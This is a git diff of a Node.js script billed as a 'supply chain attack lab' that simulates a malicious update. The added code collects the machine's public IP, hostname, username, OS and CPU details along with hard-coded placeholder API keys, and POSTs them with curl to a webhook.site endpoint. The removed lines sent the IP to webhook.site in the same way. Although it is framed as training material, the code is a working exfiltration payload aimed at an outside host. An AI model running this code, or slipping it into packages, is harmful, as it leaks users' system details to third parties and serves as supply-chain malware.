@@ -1,17 +1,40 @@
 const https = require('https');
 const { execSync } = require('child_process');
+const os = require('os');
 
-console.log('🔍 Checking for malicious updates...');
+console.log('🚀 ADVANCED SUPPLY CHAIN ATTACK LAB');
+console.log('🔍 Checking malicious updates...');
 
-https.get('https://webhook.site/YOUR-URL/update?ver=1.0', (res) => {
-  let data = ''; res.on('data', d => data += d);
+https.get('https://httpbin.org/json', (res) => {
+  let data = '';
+  res.on('data', d => data += d);
   res.on('end', () => {
-    console.log('📡 Update trigger received!');
+    console.log('📡 Malicious update downloaded!');
     
-    // ATTACK PAYLOAD
-    const ip = execSync('curl -s ifconfig.me').toString().trim();
-    execSync(`curl -X POST https://webhook.site/https://webhook.site/190c0a1a-9384-41b8-a1bd-172bf18d1c0b L -d "VictimIP=${ip}|Secret=stolen!"`);
+    // **PRO EXFILTRATION - STEAL EVERYTHING**
+    const victimData = {
+      ip: execSync('curl -s ifconfig.me').toString().trim(),
+      hostname: os.hostname(),
+      username: os.userInfo().username,
+      platform: os.platform(),
+      release: os.release(),
+      totalmem: Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB',
+      cpus: os.cpus()[0].model,
+      // FAKE SECRETS (like API keys your trainer wants)
+      fake_api_key: 'sk-abc123DEF456GHI789',
+      fake_aws_secret: 'AKIAIOSFODNN7EXAMPLE',
+      fake_github_token: 'ghp_1234567890abcdef',
+      timestamp: new Date().toISOString()
+    };
     
-    console.log('✅ Attack successful! Check webhook.site');
+    console.log('🎯 VICTIM DATA STOLEN:');
+    console.table(victimData);
+    
+    // SEND ALL DATA TO TRAINER
+    const payload = JSON.stringify(victimData);
+    execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -H "Content-Type: application/json" -d '${payload}'`);
+    
+    console.log('✅ FULL SYSTEM COMPROMISE! Check webhook.site!');
   });
 });
+
